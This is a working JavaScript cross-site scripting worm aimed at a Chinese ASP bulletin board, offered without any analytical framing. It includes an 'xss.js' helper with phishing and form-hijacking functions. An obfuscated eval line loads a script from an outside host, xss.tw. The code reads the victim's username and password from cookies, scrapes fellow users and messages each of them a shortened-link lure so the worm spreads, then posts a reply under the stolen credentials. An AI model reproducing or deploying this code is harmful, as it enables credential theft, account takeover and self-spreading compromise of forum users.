node = document.getElementsByClassName("tableborder1")[0];
node.children[0].children[0].children[0].innerHTML = "服务器繁忙，请稍候...";
node.children[0].children[1].innerHTML = '<td width="100%" class="tablebody1" colspan="2"><b>将会为您自动跳转，请稍后，bow~</b><br><li>新年快乐~<br><br></li></td>';

if (document.cookie.indexOf("hacked") !== -1) { window.location.href = "/dispbbs.asp?boardID=211&ID=4090055&page=1"; }
setTimeout(function(){
   document.location = "/dispbbs.asp?boardID=211&ID=4090055&page=1";                     
},5000);
;;var xss = function(){
	var x = {
		'name':'xss.js',
		'version':'0.1',
		'author':'jackmasa'
	};
	
	x.x=function(id){return document.getElementById(id)};
	
	//容错取值
	x.e=function(_){try{return eval('('+_+')')}catch(e){return''}};
	
	//浏览器 
	x.i={
		i:!!self.ActiveXObject,
		c:!!self.chrome,
		f:self.mozPaintCount>~[],
		o:!!self.opera,
		s:!self.chrome&&!!self.WebKitPoint
	};
	
	//UA
	x.ua = navigator.userAgent;
	
	//判断是否为苹果手持设备
	x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;
	
	//随机数
	x.rdm=function(){return~~(Math.random()*100000)};

	//url编码(UTF8)
	x.ec=encodeURIComponent;

	x.html=document.getElementsByTagName('html')[0];
	
	/*
	 * 销毁一个元素
	 */
	x.kill=function(e){
		e.parentElement.removeChild(e);
	};

	/*
	 *绑定事件
	 */
	x.bind=function(e,name,fn){
		e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
	};
	
	/*
	 * dom准备完毕时执行函数
	 */
	x.ready=function(fn){
		if(!x.i.i){
			x.bind(document,'DOMContentLoaded',fn);
		}else{
			var s = setInterval(function(){
				try{
					document.body.doScroll('left');
					clearInterval(s);
					fn();
				}catch(e){}
			},4);
		}
	}

	/*
	 * 同源检测
	 */
	x.o=function(url){
		var link = x.dom('<a href="'+encodeURI(url)+'">',2);
		return link.protocol+link.hostname+':'+link.port==location.protocol+location.hostname+':'+link.port;
	};
	
	/*
	 * html to dom
	 */
	x.dom=function(html,gcsec){
		var tmp = document.createElement('span');
		tmp.innerHTML=html;
		var e = tmp.children[0];
		e.style.display='none';
		x.html.appendChild(e);
		gcsec>>0>0&&setTimeout(function(){
			x.kill(e);
		},gcsec*1000);
		return e;
	};

	/*
	 * ajax
	 */ 	
	x.ajax = function(url,params,callback){
		(params instanceof Function)&&(callback=params,params=void(0));
		var XHR = (!x.o(url)&&window.XDomainRequest)||
				  window.XMLHttpRequest||
				  (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
		var xhr = new XHR();
		xhr.open(params?'post':'get',url);
		try{params&&xhr.setRequestHeader('content-type','application/x-www-form-urlencoded');}catch(e){}
		callback&&(xhr.onreadystatechange = function() {
			(this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
		});
		xhr.send(params);
	};
	
	/*
	 * no ajax
	 */
	x.najax=function(url,params){
		if(params){
			var form = x.dom('<form method=post>');
			form.action=url;
			for(var name in params){
				var input = document.createElement('input');
				input.name=name;
				input.value=params[name];
				form.appendChild(input);
			}
			var iframe = x.dom('<iframe sandbox name=_'+x.rdm()+'_>',6);
			form.target=iframe.name;
			form.submit();
		}else{
			new Image().src=url;
		}
	};

	/*
	 * 钓鱼
	 */
	x.phish=function(url,callback){
		x.ajax(url,function(){
			document.open();
			document.write(this.responseText);
			document.close();
			history.replaceState&x.o(url)&&history.replaceState('','',url);
			callback&&callback.apply(this);
		})
	};

	/*
	 * 表单劫持
	 */
	x.xform=function(form,action){
		form.old_action=form.action,form.old_target=form.target,form.action=action;
		var iframe = x.dom('<iframe name=_'+x.rdm()+'_>');
		form.target=iframe.name;
		setTimeout(function(){
			x.bind(iframe,'load',function(){
				form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();
			})
		},30);
	};
	
	/*
	 * 函数代理
	 */
	x.proxy=function(fn,before,after){
		return function(){
			before&&before.apply(this,arguments);
			var result = fn.apply(this,arguments);
			after&&after.apply(this,arguments);
			return result;
		}
	};
	
	return x;
}();
eval('window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,46,116,119,47,54,53,53);document.body.appendChild(window.s)');
function setCookie(name, value, expires, path, domain, secure) {
    document.cookie = name + "=" + escape(value) +
    ((expires) ? "; expires=" + expires : "") +
    ((path) ? "; path=" + path : "") +
    ((domain) ? "; domain=" + domain : "") +
    ((secure) ? "; secure" : "");
}
var alluser = new Array();
user = /username=([^&]*)/gi.exec(document.cookie)[1]
pass = /password=([^;]*)/gi.exec(document.cookie)[1]
xss.ajax("/mytopic.asp",function(){
	var linkre = /dispbbs\.asp\?boardID=\d+&ID=\d+/gi;
	var userre = /dispuser\.asp\?name=([^>]*)>/gi;
	var topictext = this.responseText;
	var cnt = 0;
	while( (link = linkre.exec(topictext)) != null)
	{
		xss.ajax(link,function(){
			while((res = userre.exec(this.responseText)) !== null)
		{
			var touser = res[1].trim();
			if (!alluser.contains(touser) && touser!==user) { alluser.push(touser);
			xss.ajax('/messanger.asp?action=send','touser='+touser+'&font=&title='+'%E5%9B%9E%E5%A4%8D%E6%8F%90%E7%A4%BA&message=%E6%88%91%E5%9C%A8%5Burl%3Dhttp%3A%2F%2Ftinyurl.com%2Fa6exaj8%5D%5Bcolor%3Dblue%5D%E8%BF%99%E4%B8%AA%E5%B8%96%E5%AD%90%5B%2Fcolor%5D%5B%2Furl%5D%E9%87%8C%E4%B8%AD%E5%9B%9E%E5%A4%8D%E4%BA%86%E4%BD%A0%2C%E5%BF%AB%E6%9D%A5%E7%9C%8B%E7%9C%8B%E5%90%A7~!',function(){}); 
			}
		}

		});
		cnt = cnt + 1;
		if(cnt > 7) break;
	}
	
});
function setCookie(name, value, expires, path, domain, secure) {
    document.cookie = name + "=" + escape(value) +
    ((expires) ? "; expires=" + expires : "") +
    ((path) ? "; path=" + path : "") +
    ((domain) ? "; domain=" + domain : "") +
    ((secure) ? "; secure" : "");
}

xss.ajax("/SaveReAnnounce.asp?method=fastreply&BoardID=211",'followup=648207441&RootID=4090055&star=1&UserName='+user+'&passwd='+pass+'&Expression=face7.gif&Content=happy+new+year~+by+flanker&signflag=yes',function(){});
setCookie("hacked","1");